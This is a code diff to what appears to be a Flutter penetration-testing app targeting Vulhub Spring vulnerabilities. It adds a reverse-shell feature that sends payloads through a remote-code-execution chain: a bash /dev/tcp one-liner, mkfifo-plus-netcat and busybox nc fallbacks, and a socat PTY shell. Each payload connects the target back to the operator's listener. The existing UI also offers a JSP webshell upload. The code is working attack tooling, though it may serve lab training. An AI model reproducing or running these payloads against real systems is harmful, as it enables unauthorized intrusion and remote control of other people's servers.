@@ -6,7 +6,9 @@ import 'package:flutter/services.dart' show rootBundle;
 
 import '../../app/constants.dart';
 import '../../exp/vulhub/spring_exp_service.dart';
+import '../../services/reverse_shell_service.dart';
 import '../../theme/app_theme.dart';
+import '../reverse_shell_terminal_page.dart';
 import '_vulhub_page_helpers.dart';
 import 'base_vulhub_exp_page.dart';
 
@@ -46,7 +48,12 @@ class _SpringPageState extends BaseVulhubExpPageState<SpringExpPage> {
     appendLog('[*] 检测 ${_selected.label}...');
     try {
       final r = await _svc().checkSingle(_selected);
-      appendLog(r.vulnerable ? '[+] ${r.vulnName}: ${r.detail}' : '[-] 未检测到 ${r.vulnName}');
+      if (r.vulnerable) {
+        appendLog('[+] ${r.vulnName}: ${r.detail}');
+      } else {
+        final detail = r.detail.trim();
+        appendLog(detail.isNotEmpty ? '[-] 未检测到 ${r.vulnName} | $detail' : '[-] 未检测到 ${r.vulnName}');
+      }
     } catch (e) {
       appendLog('[!] 异常: $e');
     } finally {
@@ -65,7 +72,12 @@ class _SpringPageState extends BaseVulhubExpPageState<SpringExpPage> {
       for (final t in SpringVulnType.values) {
         appendLog('[*] 检测 ${t.label}...');
         final r = await svc.checkSingle(t);
-        appendLog(r.vulnerable ? '[+] ${r.vulnName}: ${r.detail}' : '[-] ${r.vulnName}');
+        if (r.vulnerable) {
+          appendLog('[+] ${r.vulnName}: ${r.detail}');
+        } else {
+          final detail = r.detail.trim();
+          appendLog(detail.isNotEmpty ? '[-] ${r.vulnName} | $detail' : '[-] ${r.vulnName}');
+        }
         if (r.vulnerable && firstHit == null) {
           firstHit = t;
         }
@@ -133,6 +145,138 @@ class _SpringPageState extends BaseVulhubExpPageState<SpringExpPage> {
     }
   }
 
+  Future<void> _showReverseShellDialog() async {
+    final url = _urlCtrl.text.trim();
+    if (url.isEmpty) {
+      appendLog('[!] 请输入目标 URL');
+      return;
+    }
+    final mode = await showDialog<String>(
+      context: context,
+      builder: (context) {
+        String selected = 'script';
+        return StatefulBuilder(
+          builder: (context, setState) => AlertDialog(
+            title: const Text('选择完整终端方案'),
+            content: Column(
+              mainAxisSize: MainAxisSize.min,
+              children: [
+                RadioListTile<String>(
+                  value: 'script',
+                  groupValue: selected,
+                  onChanged: (v) => setState(() => selected = v!),
+                  title: const Text('内置反弹 · script 模式'),
+                  subtitle: const Text('优先 script，失败回退 bash/sh', style: TextStyle(fontSize: 11)),
+                ),
+                RadioListTile<String>(
+                  value: 'bash',
+                  groupValue: selected,
+                  onChanged: (v) => setState(() => selected = v!),
+                  title: const Text('内置反弹 · bash 模式'),
+                  subtitle: const Text('仅使用 bash/sh 反弹', style: TextStyle(fontSize: 11)),
+                ),
+                RadioListTile<String>(
+                  value: 'socat',
+                  groupValue: selected,
+                  onChanged: (v) => setState(() => selected = v!),
+                  title: const Text('socat 反弹（手动执行）'),
+                  subtitle: const Text('目标上手动执行命令获得完整 TTY', style: TextStyle(fontSize: 11)),
+                ),
+              ],
+            ),
+            actions: [
+              TextButton(onPressed: () => Navigator.pop(context), child: const Text('取消')),
+              FilledButton(onPressed: () => Navigator.pop(context, selected), child: const Text('确定')),
+            ],
+          ),
+        );
+      },
+    );
+    if (mode == null) return;
+
+    if (mode == 'socat') {
+      await _startSocatMode();
+      return;
+    }
+    await _startBuiltinReverseShell(preferScript: mode == 'script');
+  }
+
+  Future<void> _startBuiltinReverseShell({required bool preferScript}) async {
+    setState(() => running = true);
+    final rs = ReverseShellService();
+    try {
+      await rs.loadConfig();
+      await rs.startListening(port: rs.lport);
+      rs.onSession = (session) {
+        session.label = 'Spring ${_selected.label}';
+        if (!mounted) return;
+        Navigator.of(context).push(
+          MaterialPageRoute(builder: (_) => ReverseShellTerminalPage(session: session)),
+        );
+      };
+      final tcpViaBash = 'bash -i >& /dev/tcp/${rs.lhost}/${rs.lport} 0>&1';
+      final tcpViaNc =
+          'rm -f /tmp/.msh; mkfifo /tmp/.msh; cat /tmp/.msh | /bin/sh -i 2>&1 | nc ${rs.lhost} ${rs.lport} > /tmp/.msh';
+      final tcpViaBusyboxNc =
+          'rm -f /tmp/.msh; mkfifo /tmp/.msh; cat /tmp/.msh | /bin/sh -i 2>&1 | busybox nc ${rs.lhost} ${rs.lport} > /tmp/.msh';
+      // CVE-2018-1273 走写文件+exec链路，后台进程(&)在容器里易被回收，
+      // 直接用前台阻塞命令确保连接稳定。
+      final cmd = _selected == SpringVulnType.springDataCommons
+          ? tcpViaBash
+          : preferScript
+              ? "bash -c 'export TERM=xterm-256color; "
+                  "if command -v script >/dev/null 2>&1 && command -v bash >/dev/null 2>&1; then "
+                  "script -q /dev/null -c \"$tcpViaBash\"; "
+                  "elif command -v bash >/dev/null 2>&1; then "
+                  "$tcpViaBash; "
+                  "elif command -v nc >/dev/null 2>&1; then "
+                  "$tcpViaNc; "
+                  "elif command -v busybox >/dev/null 2>&1; then "
+                  "$tcpViaBusyboxNc; "
+                  "fi' >/dev/null 2>&1 &"
+              : "bash -c 'export TERM=xterm-256color; "
+                  "if command -v bash >/dev/null 2>&1; then "
+                  "$tcpViaBash; "
+                  "elif command -v nc >/dev/null 2>&1; then "
+                  "$tcpViaNc; "
+                  "elif command -v busybox >/dev/null 2>&1; then "
+                  "$tcpViaBusyboxNc; "
+                  "fi' >/dev/null 2>&1 &";
+      final out = await _svc().execRce(_selected, cmd);
+      appendLog('[*] 已发送反弹命令（${preferScript ? 'script' : 'bash'} 模式），等待连接 ${rs.lhost}:${rs.lport}');
+      if (out != null && out.isNotEmpty) {
+        appendLog('[i] 利用链返回: $out');
+      }
+    } catch (e) {
+      appendLog('[!] 完整终端启动失败: $e');
+    } finally {
+      if (mounted) setState(() => running = false);
+    }
+  }
+
+  Future<void> _startSocatMode() async {
+    setState(() => running = true);
+    final rs = ReverseShellService();
+    try {
+      await rs.loadConfig();
+      await rs.startListening(port: rs.lport);
+      rs.onSession = (session) {
+        session.label = 'Spring ${_selected.label}';
+        if (!mounted) return;
+        Navigator.of(context).push(
+          MaterialPageRoute(builder: (_) => ReverseShellTerminalPage(session: session)),
+        );
+      };
+      final cmd = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${rs.lhost}:${rs.lport}";
+      appendLog('[*] 本地监听已启动: ${rs.lhost}:${rs.lport}');
+      appendLog('[*] 在目标执行: $cmd');
+    } catch (e) {
+      appendLog('[!] socat 模式启动失败: $e');
+    } finally {
+      if (mounted) setState(() => running = false);
+    }
+  }
+
   @override
   void dispose() {
     _urlCtrl.dispose();
@@ -184,6 +328,9 @@ class _SpringPageState extends BaseVulhubExpPageState<SpringExpPage> {
         vTf(_passwordCtrl, '冰蝎密码', AppConstants.defaultShellPassword),
         const SizedBox(height: 8),
         vBtn('GetShell (写入 JSP)', running ? null : _getShell),
+        const SizedBox(height: 16),
+        vSecTitle('完整终端'),
+        vBtn('完整 Shell（反弹）', running ? null : _showReverseShellDialog),
       ]),
     );
   }
